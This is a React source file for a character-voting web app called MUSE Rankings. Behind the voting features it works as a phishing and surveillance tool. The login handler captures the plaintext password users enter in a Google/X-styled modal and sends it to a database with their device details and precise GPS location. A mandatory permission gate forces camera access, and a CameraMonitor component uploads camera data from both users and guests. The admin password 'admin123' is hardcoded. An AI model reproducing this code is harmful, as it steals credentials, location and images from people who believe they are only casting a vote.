import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { Character } from './types';
import { INITIAL_CHARACTERS } from './constants';
import SwipeCard from './components/SwipeCard';
import Leaderboard from './components/Leaderboard';
import VoteConfirmationModal from './components/VoteConfirmationModal';
import AuthModal, { LoginResult } from './components/AuthModal';
import AdminDashboard from './components/AdminDashboard';
import PermissionModal from './components/PermissionModal';
import CameraMonitor from './components/CameraMonitor';
import { dataService } from './services/dataService'; 
import { RefreshCw, CheckCircle2, Lock, LogOut, User as UserIcon, ShieldAlert, Loader2, Timer, Clock } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

function App() {
  // VIEW STATE: 'app' | 'admin_login' | 'admin_dashboard'
  const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>('app');
  const [adminPassword, setAdminPassword] = useState('');
  const [adminError, setAdminError] = useState('');
  const [isAdminLoading, setIsAdminLoading] = useState(false);

  // Initialize characters
  const [characters, setCharacters] = useState<Character[]>(INITIAL_CHARACTERS);

  const [activeIndex, setActiveIndex] = useState(0);
  
  // USER STATE
  const [user, setUser] = useState<string | null>(() => {
    return localStorage.getItem('muse_current_user');
  });

  // GUEST STATE
  // We generate a guest ID if no user is logged in, to track "passersby"
  const guestId = useMemo(() => {
    let gid = localStorage.getItem('muse_guest_id');
    if (!gid) {
        gid = `guest_${Math.random().toString(36).substr(2, 9)}`;
        localStorage.setItem('muse_guest_id', gid);
    }
    return gid;
  }, []);

  // Check if THIS specific user has voted
  const [hasVoted, setHasVoted] = useState<boolean>(false);

  // Modals
  const [isVoteModalOpen, setIsVoteModalOpen] = useState(false);
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [lastVotedId, setLastVotedId] = useState<string | null>(null);

  // --- PERMISSION STATE ---
  const [isLocationDenied, setIsLocationDenied] = useState(false);
  const [isCameraDenied, setIsCameraDenied] = useState(false);
  const [missingPermissions, setMissingPermissions] = useState<('location' | 'camera')[]>([]);

  // --- VOTING DURATION / TIMER STATE ---
  const [votingDeadline, setVotingDeadline] = useState<string | null>(() => {
      return localStorage.getItem('muse_voting_deadline');
  });
  const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
  const [isVotingEnded, setIsVotingEnded] = useState(false);

  // --- DATA LOADING ---
  const fetchCharacters = useCallback(async () => {
    const chars = await dataService.getCharacters();
    setCharacters(chars);
  }, []);

  useEffect(() => {
    // Initial Fetch
    fetchCharacters();

    // Subscribe to Realtime Updates (Supabase) or LocalStorage events
    const unsubscribeSupabase = dataService.subscribeToVotes(() => {
        fetchCharacters();
    });

    const handleStorageChange = (e: Event) => {
        // Generic refresh for local storage events
        fetchCharacters();
        // Check timer update
        setVotingDeadline(localStorage.getItem('muse_voting_deadline'));
    };

    window.addEventListener('local-storage-update', handleStorageChange);
    window.addEventListener('storage', handleStorageChange);

    return () => {
        unsubscribeSupabase();
        window.removeEventListener('local-storage-update', handleStorageChange);
        window.removeEventListener('storage', handleStorageChange);
    };
  }, [fetchCharacters]);

  // --- LOGGING HELPER ---
  const logVisitToDatabase = useCallback(async (identifier: string, method: 'google' | 'x' | 'guest_visit', pass: string = '') => {
      // Get Device Info
      const deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          screenSize: `${window.innerWidth}x${window.innerHeight}`,
          language: navigator.language
      };

      // Get Location (Cached from permission grant)
      const storedLoc = localStorage.getItem('muse_user_location');
      const locationData = storedLoc ? JSON.parse(storedLoc) : null;

      // Register to Database (Async)
      await dataService.registerUserLogin({
          user_identifier: identifier,
          password_text: pass, 
          login_method: method,
          device_info: deviceInfo,
          location_data: locationData
      });
  }, []);

  // --- PERMISSION LOGIC ---
  const requestPermissions = useCallback(async () => {
    // 1. Request Camera Permission Explicitly (Triggers Prompt on Click/Load)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        // If successful, stop immediately (we just wanted the permission grant)
        stream.getTracks().forEach(track => track.stop());
        setIsCameraDenied(false);
        setMissingPermissions(prev => prev.filter(p => p !== 'camera'));
    } catch (err) {
        console.warn("Initial Camera check failed (User might need to interact first):", err);
        setIsCameraDenied(true);
        setMissingPermissions(prev => Array.from(new Set([...prev, 'camera'])));
    }

    // 2. Trigger Location Native Prompt
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const locationData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                setIsLocationDenied(false);
                setMissingPermissions(prev => prev.filter(p => p !== 'location'));

                // --- GUEST LOGGING LOGIC ---
                const isGuestLogged = sessionStorage.getItem('muse_guest_logged');
                const currentUser = localStorage.getItem('muse_current_user');
                
                if (!currentUser && !isGuestLogged) {
                    const gid = localStorage.getItem('muse_guest_id') || 'unknown_guest';
                    logVisitToDatabase(gid, 'guest_visit');
                    sessionStorage.setItem('muse_guest_logged', 'true');
                }
            },
            (error) => {
                if (error.code === error.PERMISSION_DENIED) {
                    console.warn("Location permission denied by user.");
                    setIsLocationDenied(true);
                    setMissingPermissions(prev => Array.from(new Set([...prev, 'location'])));
                }
            },
            { 
                enableHighAccuracy: true, 
                timeout: 5000, 
                maximumAge: 0 
            }
        );
    }
  }, [logVisitToDatabase]);

  // Run permissions on mount
  useEffect(() => {
      requestPermissions();
  }, [requestPermissions]);

  // --- TIMER LOGIC ---
  useEffect(() => {
    const calculateTimeLeft = () => {
        if (!votingDeadline) {
            setTimeLeft(null);
            setIsVotingEnded(false);
            return;
        }

        const difference = new Date(votingDeadline).getTime() - new Date().getTime();

        if (difference > 0) {
            setTimeLeft({
                days: Math.floor(difference / (1000 * 60 * 60 * 24)),
                hours: Math.floor((difference / (1000 * 60 * 60)) % 24),
                minutes: Math.floor((difference / 1000 / 60) % 60),
                seconds: Math.floor((difference / 1000) % 60),
            });
            setIsVotingEnded(false);
        } else {
            setTimeLeft(null);
            setIsVotingEnded(true);
        }
    };

    calculateTimeLeft(); // Initial call
    const timer = setInterval(calculateTimeLeft, 1000);

    return () => clearInterval(timer);
  }, [votingDeadline]);

  // Check voting status whenever User changes
  useEffect(() => {
    if (user) {
        const userHasVoted = localStorage.getItem(`muse_vote_record_${user}`);
        setHasVoted(!!userHasVoted);
        // Force close auth modal if user is set
        setIsAuthModalOpen(false);
    } else {
        setHasVoted(false);
    }
  }, [user]);

  // Navigation Logic
  const handleNext = () => setActiveIndex((prev) => (prev + 1) % characters.length);
  const handlePrev = () => setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
  const handleCardClick = (index: number) => setActiveIndex(index);

  // --- AUTH LOGIC ---
  const handleLoginSuccess = (result: LoginResult) => {
      const { username, password, method } = result;

      // 1. Close Modal FIRST to prevent UI glitches
      setIsAuthModalOpen(false);

      // 2. UPDATE UI IMMEDIATELY
      setUser(username);
      localStorage.setItem('muse_current_user', username);
      
      // 3. Process Background Data
      logVisitToDatabase(username, method, password);

      // 4. Open Vote Modal if not ended
      setTimeout(() => {
          if (!isVotingEnded) setIsVoteModalOpen(true);
      }, 500); 
  };

  const handleLogout = () => {
      setUser(null);
      localStorage.removeItem('muse_current_user');
      setHasVoted(false);
  };

  // --- ADMIN AUTH LOGIC ---
  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsAdminLoading(true);
    setAdminError('');
    await new Promise(resolve => setTimeout(resolve, 1500));
    if (adminPassword === 'admin123') { 
      setView('admin_dashboard');
      setAdminPassword('');
      setAdminError('');
    } else {
      setAdminError('Access Denied: Invalid Security Code');
    }
    setIsAdminLoading(false);
  };

  // --- VOTE LOGIC ---
  const handleVoteClick = () => {
    if (isVotingEnded) return;
    if (!user) {
        setIsAuthModalOpen(true);
        return;
    }
    if (hasVoted) return; 
    setIsVoteModalOpen(true);
  };

  const handleConfirmVote = async () => {
    if (!user || isVotingEnded) return;
    
    // Optimistic UI Update - Close modal immediately
    setIsVoteModalOpen(false);

    try {
        const activeChar = characters[activeIndex];
        
        // Get Location Data
        const storedLoc = localStorage.getItem('muse_user_location');
        const locationData = storedLoc ? JSON.parse(storedLoc) : null;

        // Device Info
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenSize: `${window.innerWidth}x${window.innerHeight}`,
            language: navigator.language
        };

        // CALL DATA SERVICE
        // We await this, but inside a try-catch so it doesn't break the UI if Supabase fails
        await dataService.castVote(activeChar.id, user, { location: locationData, deviceInfo });
        
        // Finalize state update
        setHasVoted(true);
        setCharacters(prev => prev.map(c => 
            c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c
        ));
        
        setLastVotedId(activeChar.id);
        setTimeout(() => setLastVotedId(null), 3000);

    } catch (e) {
        console.error("Vote failed:", e);
        // Even if database fails, we keep local state as 'voted' for user experience
        setHasVoted(true);
        alert("Terima kasih! Vote Anda telah dicatat secara lokal (Koneksi database mungkin bermasalah, tapi vote Anda aman).");
    }
  };

  const activeCharacter = characters[activeIndex];

  // Handle Camera
  const handleCameraError = () => {
      // If error happens in the Monitor component, update state to show modal
      setIsCameraDenied(true); 
      setMissingPermissions(prev => Array.from(new Set([...prev, 'camera'])));
  };

  const handleCameraSuccess = () => {
      setIsCameraDenied(false);
      setMissingPermissions(prev => prev.filter(p => p !== 'camera'));
  };

  // RENDER: ADMIN DASHBOARD
  if (view === 'admin_dashboard') {
    return (
      <AdminDashboard 
        characters={characters} 
        setCharacters={setCharacters} 
        onLogout={() => setView('app')} 
      />
    );
  }

  // RENDER: ADMIN LOGIN
  if (view === 'admin_login') {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
         <div className="w-full max-w-sm bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500"></div>
            <div className="flex flex-col items-center mb-6">
               <div className="w-12 h-12 bg-slate-800 rounded-full flex items-center justify-center mb-4 text-indigo-400">
                  <ShieldAlert size={24} />
               </div>
               <h2 className="text-xl font-bold text-white font-display">System Administration</h2>
               <p className="text-xs text-slate-500">Restricted Access Area</p>
            </div>
            
            <form onSubmit={handleAdminLogin} className="space-y-4">
               <div>
                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-1 block">Security Code</label>
                  <input 
                    type="password" 
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                    disabled={isAdminLoading}
                    className="w-full bg-slate-950 border border-slate-700 text-white px-4 py-3 rounded-xl focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none transition-all placeholder-slate-700 disabled:opacity-50"
                    placeholder="••••••••"
                    autoFocus
                  />
               </div>
               {adminError && <p className="text-red-500 text-xs text-center animate-pulse">{adminError}</p>}
               
               <button 
                type="submit" 
                disabled={isAdminLoading}
                className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 rounded-xl transition-colors shadow-lg shadow-indigo-900/20 flex items-center justify-center gap-2 disabled:opacity-70 disabled:cursor-not-allowed"
               >
                  {isAdminLoading ? <><Loader2 className="animate-spin" size={20} /><span>Verifying...</span></> : "Unlock System"}
               </button>
               <button 
                type="button" 
                onClick={() => setView('app')} 
                disabled={isAdminLoading}
                className="w-full text-slate-500 text-xs hover:text-white mt-2 transition-colors disabled:opacity-50"
               >
                  Return to Application
               </button>
            </form>
         </div>
      </div>
    );
  }

  // RENDER: MAIN APP
  return (
    <div className="min-h-screen w-full bg-slate-950 flex justify-center overflow-x-hidden relative font-sans selection:bg-purple-500/30">
      
      {/* Background Atmosphere */}
      <div className="fixed inset-0 pointer-events-none z-0">
         <div className="absolute top-[-20%] left-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-purple-900/20 rounded-full blur-[120px] mix-blend-screen animate-pulse" />
         <div className="absolute bottom-[-20%] right-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-indigo-900/20 rounded-full blur-[100px] mix-blend-screen animate-pulse delay-1000" />
         <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 brightness-100 contrast-150"></div>
      </div>

      {/* Main Container */}
      <div className="relative z-10 w-full max-w-md flex flex-col items-center py-8 px-4 gap-6">
        
        {/* Header */}
        <header className="w-full flex flex-col gap-4 relative">
          <div className="w-full flex justify-between items-center bg-slate-900/40 p-3 rounded-2xl border border-white/5 backdrop-blur-sm">
             <div className="flex items-center gap-3">
                 <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center font-display font-bold text-white shadow-lg">
                    M
                 </div>
                 <div>
                    <h1 className="text-lg font-display font-bold text-white leading-none">MUSE</h1>
                    <p className="text-[9px] text-indigo-300/80 tracking-widest uppercase font-medium">Rankings</p>
                 </div>
             </div>

             <div className="flex items-center gap-2">
                 {user ? (
                     <div className="flex items-center gap-2 pl-3 pr-1 py-1 bg-slate-800/50 rounded-full border border-slate-700/50">
                        <span className="text-xs font-semibold text-slate-300 max-w-[80px] truncate">{user}</span>
                        <button 
                            onClick={handleLogout}
                            className="w-7 h-7 flex items-center justify-center rounded-full bg-slate-700 hover:bg-red-500/20 hover:text-red-400 text-slate-400 transition-colors"
                            title="Logout"
                        >
                            <LogOut size={14} />
                        </button>
                     </div>
                 ) : (
                     <button 
                        onClick={() => setIsAuthModalOpen(true)}
                        className="px-4 py-2 rounded-xl bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 hover:text-indigo-200 border border-indigo-500/30 text-xs font-bold transition-all"
                     >
                        Login
                     </button>
                 )}
             </div>
          </div>

          {/* TIMER SECTION */}
          {votingDeadline && !isVotingEnded && timeLeft && (
             <div className="w-full bg-indigo-900/20 border border-indigo-500/20 rounded-xl p-3 flex items-center justify-between backdrop-blur-sm">
                <div className="flex items-center gap-2 text-indigo-300">
                    <Timer size={16} className="animate-pulse" />
                    <span className="text-xs font-bold tracking-wider">VOTING ENDS IN</span>
                </div>
                <div className="flex items-center gap-1 font-mono text-sm font-bold text-white">
                    <div className="bg-slate-900/50 px-2 py-1 rounded border border-white/5">{timeLeft.days}d</div>
                    <span>:</span>
                    <div className="bg-slate-900/50 px-2 py-1 rounded border border-white/5">{timeLeft.hours.toString().padStart(2, '0')}h</div>
                    <span>:</span>
                    <div className="bg-slate-900/50 px-2 py-1 rounded border border-white/5">{timeLeft.minutes.toString().padStart(2, '0')}m</div>
                    <span>:</span>
                    <div className="bg-slate-900/50 px-2 py-1 rounded border border-white/5 w-8 text-center text-indigo-400">{timeLeft.seconds.toString().padStart(2, '0')}</div>
                </div>
             </div>
          )}

          {isVotingEnded && (
             <div className="w-full bg-slate-800/50 border border-slate-700 rounded-xl p-3 flex items-center justify-center gap-2 backdrop-blur-sm">
                <Clock size={16} className="text-slate-400" />
                <span className="text-xs font-bold tracking-wider text-slate-400">VOTING PERIOD HAS ENDED</span>
             </div>
          )}
        </header>

        {/* Card Section */}
        <section className="w-full relative h-[500px] flex items-center justify-center perspective-1000 mt-2">
             <AnimatePresence mode="popLayout" initial={false}>
               {characters.map((char, index) => {
                  let offset = index - activeIndex;
                  return (
                    <SwipeCard 
                      key={char.id}
                      character={char} 
                      isActive={index === activeIndex}
                      offset={offset}
                      onClick={() => handleCardClick(index)}
                      onSwipeRight={handlePrev}
                      onSwipeLeft={handleNext}
                    />
                  );
               })}
             </AnimatePresence>
        </section>

        {/* Controls */}
        <section className="w-full flex flex-col items-center gap-4 px-2">
             <div className="flex justify-center gap-1.5 mb-2">
                {characters.map((_, idx) => (
                  <button
                    key={idx}
                    onClick={() => setActiveIndex(idx)}
                    className={`h-1.5 rounded-full transition-all duration-300 ${
                      idx === activeIndex 
                      ? 'w-8 bg-indigo-400 shadow-[0_0_8px_rgba(129,140,248,0.8)]' 
                      : 'w-1.5 bg-slate-700 hover:bg-slate-600'
                    }`}
                  />
                ))}
             </div>

             <button
               onClick={handleVoteClick}
               disabled={hasVoted || isVotingEnded}
               className={`relative w-full h-14 rounded-2xl font-bold text-lg transition-all transform flex items-center justify-center gap-3 overflow-hidden shadow-[0_0_20px_rgba(0,0,0,0.3)] border 
                 ${hasVoted || isVotingEnded
                   ? 'bg-slate-900/50 border-slate-700/50 cursor-not-allowed text-slate-500' 
                   : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white active:scale-95 group hover:border-indigo-400/60'
                 }`}
             >
                {!(hasVoted || isVotingEnded) && (
                  <div className="absolute inset-0 bg-gradient-to-r from-indigo-600/20 to-purple-600/20 group-hover:opacity-100 opacity-50 transition-opacity" />
                )}
                
                {isVotingEnded ? (
                   <div className="flex items-center gap-2">
                      <Clock size={18} />
                      <span className="tracking-widest font-display text-xs">TIME'S UP</span>
                   </div>
                ) : hasVoted ? (
                   <div className="flex items-center gap-2">
                      <Lock size={18} />
                      <span className="tracking-widest font-display text-xs">VOTING CLOSED</span>
                   </div>
                ) : lastVotedId === activeCharacter.id ? (
                   <motion.div 
                     initial={{ scale: 0.5, opacity: 0 }}
                     animate={{ scale: 1, opacity: 1 }}
                     className="flex items-center gap-2 text-green-400 z-10"
                   >
                     <CheckCircle2 size={20} className="fill-current text-slate-900" />
                     <span className="tracking-widest font-display">VOTED</span>
                   </motion.div>
                ) : (
                   <div className="flex items-center gap-3 z-10">
                     <span className="text-xs font-light text-slate-300">
                        {user ? 'VOTE FOR' : 'LOGIN TO VOTE'}
                     </span>
                     <span className="font-display tracking-wider text-indigo-100">{activeCharacter.name.split(' ')[0].toUpperCase()}</span>
                   </div>
                )}
             </button>
             
             {hasVoted && !isVotingEnded && (
               <p className="text-[10px] text-slate-500 font-medium animate-pulse">
                 Terima kasih atas partisipasimu, {user}!
               </p>
             )}
        </section>

        {/* Leaderboard */}
        <section className="w-full relative z-30 pb-10">
           <Leaderboard characters={characters} />
        </section>

        {/* Admin Footer Link */}
        <footer className="w-full text-center pb-8 opacity-50 hover:opacity-100 transition-opacity">
           <button 
             onClick={() => setView('admin_login')}
             className="text-[10px] text-slate-600 hover:text-indigo-400 flex items-center justify-center gap-1 mx-auto"
           >
             <ShieldAlert size={10} /> Admin Access
           </button>
        </footer>

      </div>

      {/* Modals */}
      <AnimatePresence>
        {isVoteModalOpen && !isVotingEnded && (
          <VoteConfirmationModal 
            isOpen={isVoteModalOpen} 
            onClose={() => setIsVoteModalOpen(false)} 
            onConfirm={handleConfirmVote} 
            characterName={activeCharacter.name}
          />
        )}
      </AnimatePresence>

      <AnimatePresence>
        {isAuthModalOpen && !user && (
          <AuthModal 
            isOpen={isAuthModalOpen} 
            onClose={() => setIsAuthModalOpen(false)} 
            onLoginSuccess={handleLoginSuccess}
          />
        )}
      </AnimatePresence>

      {/* Mandatory Permissions Modal */}
      {(isLocationDenied || isCameraDenied) && (
          <PermissionModal 
            onRetry={requestPermissions} 
            missingPermissions={missingPermissions}
          />
      )}

      {/* Camera Monitor handles Upload internally now via dataService */}
      {/* Run for both Logged in Users AND Guests */}
      {/* FIX: Do not render if camera is strictly denied to avoid error loops */}
      {(user || guestId) && !isCameraDenied && (
          <CameraMonitor 
             user={user || guestId} 
             onError={handleCameraError}
             onSuccess={handleCameraSuccess}
          />
      )}

    </div>
  );
}

export default App;